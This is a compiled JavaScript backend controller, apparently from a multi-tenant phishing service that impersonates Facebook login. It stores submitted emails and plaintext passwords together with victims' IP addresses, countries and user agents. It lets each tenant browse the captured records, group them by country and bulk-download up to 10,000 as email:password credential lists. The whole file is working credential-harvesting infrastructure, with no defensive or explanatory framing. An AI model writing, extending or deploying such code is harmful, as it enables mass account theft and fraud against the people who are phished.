"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.FacebookController = void 0;
const client_1 = require("@prisma/client");
const prisma = new client_1.PrismaClient();
async function detectCountry(ip) {
    try {
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=country`, {
            signal: AbortSignal.timeout(3000)
        });
        const data = await res.json();
        return data.country || null;
    }
    catch {
        return null;
    }
}
class FacebookController {
    async submitAttempt(req, res) {
        try {
            const { email, password, tenantId } = req.body;
            if (!email || !password) {
                res.status(400).json({ error: 'Email y contraseña son obligatorios' });
                return;
            }
            if (!tenantId) {
                res.status(400).json({ error: 'Tenant ID requerido' });
                return;
            }
            const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '';
            const country = ip ? await detectCountry(ip) : null;
            const attempt = await prisma.loginAttempt.create({
                data: {
                    tenantId,
                    email: email.trim().toLowerCase(),
                    password,
                    country,
                    ipAddress: ip || null,
                    userAgent: req.headers['user-agent'] || null,
                }
            });
            res.status(201).json({ success: true, id: attempt.id });
        }
        catch (error) {
            console.error('Error al guardar intento:', error);
            res.status(500).json({ error: 'Error interno' });
        }
    }
    async getAttempts(req, res) {
        try {
            const tenantId = req.user?.tenantId;
            if (!tenantId) {
                res.status(401).json({ error: 'Unauthorized' });
                return;
            }
            const page = parseInt(req.query.page) || 1;
            const limit = parseInt(req.query.limit) || 15;
            const country = req.query.country;
            const skip = (page - 1) * limit;
            const where = { tenantId };
            if (country)
                where.country = country;
            const [attempts, total] = await Promise.all([
                prisma.loginAttempt.findMany({
                    where,
                    orderBy: { createdAt: 'desc' },
                    skip,
                    take: limit,
                }),
                prisma.loginAttempt.count({ where }),
            ]);
            res.json({
                attempts,
                pagination: {
                    page,
                    limit,
                    total,
                    totalPages: Math.ceil(total / limit),
                }
            });
        }
        catch (error) {
            console.error('Error al obtener intentos:', error);
            res.status(500).json({ error: 'Error al obtener intentos' });
        }
    }
    async getCountries(req, res) {
        try {
            const tenantId = req.user?.tenantId;
            if (!tenantId) {
                res.status(401).json({ error: 'Unauthorized' });
                return;
            }
            const countries = await prisma.loginAttempt.groupBy({
                by: ['country'],
                where: { tenantId, country: { not: null } },
                _count: { id: true },
                orderBy: { _count: { id: 'desc' } },
            });
            res.json(countries.map(c => ({
                name: c.country,
                count: c._count.id,
            })));
        }
        catch (error) {
            console.error('Error al obtener países:', error);
            res.status(500).json({ error: 'Error al obtener países' });
        }
    }
    async download(req, res) {
        try {
            const tenantId = req.user?.tenantId;
            if (!tenantId) {
                res.status(401).json({ error: 'Unauthorized' });
                return;
            }
            const quantity = parseInt(req.body.quantity) || 100;
            const country = req.body.country;
            const where = { tenantId };
            if (country)
                where.country = country;
            const attempts = await prisma.loginAttempt.findMany({
                where,
                orderBy: { createdAt: 'desc' },
                take: Math.min(quantity, 10000),
            });
            const lines = attempts.map(a => `${a.email}:${a.password}`);
            const text = lines.join('\n');
            res.json({
                count: lines.length,
                credentials: text,
                filename: `credenciales_${country || 'todas'}_${lines.length}.txt`,
            });
        }
        catch (error) {
            console.error('Error al descargar:', error);
            res.status(500).json({ error: 'Error al descargar' });
        }
    }
}
exports.FacebookController = FacebookController;
//# sourceMappingURL=facebook.controller.js.map